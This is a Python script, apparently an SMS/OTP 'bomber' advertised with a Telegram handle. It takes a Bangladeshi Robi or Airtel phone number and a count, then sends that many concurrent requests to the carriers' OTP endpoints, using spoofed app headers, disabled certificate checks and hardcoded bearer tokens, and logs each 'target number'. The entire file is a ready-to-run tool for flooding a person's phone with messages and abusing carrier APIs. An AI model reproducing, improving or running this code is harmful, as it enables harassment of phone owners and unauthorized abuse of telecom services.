import requests
import logging
import threading
from datetime import datetime
from colorama import init, Fore, Style
import urllib3

# Disable urllib3 warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def display_banner():
    banner = f"""
{Fore.RED}     #     #                             #####                                           
{Fore.GREEN}     #     # ######   ##   #####  ##### #     # #####    ##   ###### ##### ###### #####  
{Fore.BLUE}     #     # #       #  #  #    #   #   #       #    #  #  #  #        #   #      #    # 
{Fore.YELLOW}     ####### #####  #    # #    #   #   #       #    # #    # #####    #   #####  #    # 
{Fore.CYAN}     #     # #      ###### #####    #   #       #####  ###### #        #   #      #####  
{Fore.MAGENTA}     #     # #      #    # #   #    #   #     # #   #  #    # #        #   #      #   #  
{Fore.WHITE}     #     # ###### #    # #    #   #    #####  #    # #    # #        #   ###### #    # 

                  t.me/heartcrafter

    """
    print(banner)

def is_valid_robi_number(msisdn):
    return msisdn.startswith(('018', '014')) and msisdn.isdigit() and len(msisdn) == 11

def is_valid_airtel_number(msisdn):
    return msisdn.startswith('016') and msisdn.isdigit() and len(msisdn) == 11

def get_robi_headers():
    return {
        "token": "",
        "platform": "android",
        "appname": "robi_lite",
        "locale": "en",
        "deviceid": "e602fe23371a73a6",
        "appversion": "1000004",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "20",
        "Host": "singleapp.robi.com.bd",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/3.12.0"
    }

def get_airtel_headers():
    return {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "X-Csrf-Token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvYXBpLmJkLmFpcnRlbC5jb21cL3YxXC90b2tlbiIsImlhdCI6MTcyMzAzNjA3MSwiZXhwIjoxNzIzMTIyNDcxLCJuYmYiOjE3MjMwMzYwNzEsImp0aSI6IllhWmw2MkxkTlVyM3NadjciLCJzdWIiOiJBaXJ0ZWwifQ.OHJ-lnIH_shmscq9wZuBSW_T3FCgV_MzlM8HLBKzxe8",
        "Content-Type": "application/json;charset=utf-8",
        "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvYXBpLmJkLmFpcnRlbC5jb21cL3YxXC90b2tlbiIsImlhdCI6MTcyMzAzNjA3MSwiZXhwIjoxNzIzMTIyNDcxLCJuYmYiOjE3MjMwMzYwNzEsImp0aSI6IllhWmw2MkxkTlVyM3NadjciLCJzdWIiOiJBaXJ0ZWwifQ.OHJ-lnIH_shmscq9wZuBSW_T3FCgV_MzlM8HLBKzxe8",
        "Origin": "https://www.bd.airtel.com",
        "Referer": "https://www.bd.airtel.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Priority": "u=0",
        "Te": "trailers",
        "Connection": "close"
    }

def send_robi_request(full_msisdn, error_count):
    headers = get_robi_headers()
    data = {"msisdn": full_msisdn}
    try:
        response = requests.post("https://singleapp.robi.com.bd/api/v1/tokens/create_opt", headers=headers, data=data, verify=False)
        if response.status_code == 500:
            logging.error(f"{Fore.RED}Internal Server Error for {full_msisdn}")
            error_count[0] += 1
        else:
            response.raise_for_status()
            logging.info(f"{Fore.GREEN}Robi request successful to {full_msisdn}")
    except requests.exceptions.RequestException as e:
        logging.error(f"{Fore.RED}Robi request failed: {e}")

def send_airtel_request(full_msisdn, error_count):
    headers = get_airtel_headers()
    data = {
        "phone_number": full_msisdn,
        "lang": "en",
        "type": "internet_package",
        "plan_type": "internet_package",
        "uid": "a56f02af-908e-4d1b-b618-9f7644eedd74"
    }
    try:
        response = requests.post("https://api.bd.airtel.com/v1/otp/send_request", headers=headers, json=data, verify=False)
        if response.status_code == 500:
            logging.error(f"{Fore.RED}Internal Server Error for {full_msisdn}")
            error_count[0] += 1
        else:
            response.raise_for_status()
            logging.info(f"{Fore.GREEN}Airtel request successful to {full_msisdn}")
    except requests.exceptions.RequestException as e:
        logging.error(f"{Fore.RED}Airtel request failed: {e}")

def send_requests_concurrently(send_request_func, full_msisdn, amount, error_count):
    threads = []
    for _ in range(amount):
        thread = threading.Thread(target=send_request_func, args=(full_msisdn, error_count))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def save_log(operator, target_number, total_count, start_time, end_time, error_count):
    log_data = (
        f"Operator: {operator}, "
        f"Target Number: {target_number}, "
        f"Total Count: {total_count}, "
        f"Start Time: {start_time}, "
        f"End Time: {end_time}, "
        f"Internal Server Errors: {error_count}\n"
    )
    with open("logfile.txt", "a") as logfile:
        logfile.write(log_data)

def main():
    display_banner()
    error_count = [0]  # Use a list to allow passing by reference to threads

    try:
        while True:
            msisdn = input("Enter MSISDN (or type 'exit' to quit): ")
            if msisdn.lower() == 'exit':
                break

            if not (is_valid_robi_number(msisdn) or is_valid_airtel_number(msisdn)):
                logging.error(f"{Fore.RED}Invalid MSISDN format.")
                continue

            amount = input("Enter amount: ")
            if not amount.isdigit():
                logging.error(f"{Fore.RED}Amount must be a number.")
                continue

            full_msisdn = "88" + msisdn
            amount = int(amount)

            start_time = datetime.now()

            if is_valid_robi_number(msisdn):
                send_requests_concurrently(send_robi_request, full_msisdn, amount, error_count)
                operator = "Robi"
            elif is_valid_airtel_number(msisdn):
                send_requests_concurrently(send_airtel_request, full_msisdn, amount, error_count)
                operator = "Airtel"

            end_time = datetime.now()

            save_log(operator, full_msisdn, amount, start_time, end_time, error_count[0])

    except KeyboardInterrupt:
        end_time = datetime.now()
        save_log(operator, full_msisdn, amount, start_time, end_time, error_count[0])
        logging.info(f"{Fore.YELLOW}\nProcess interrupted and data saved to logfile.txt")

if __name__ == "__main__":
    main()
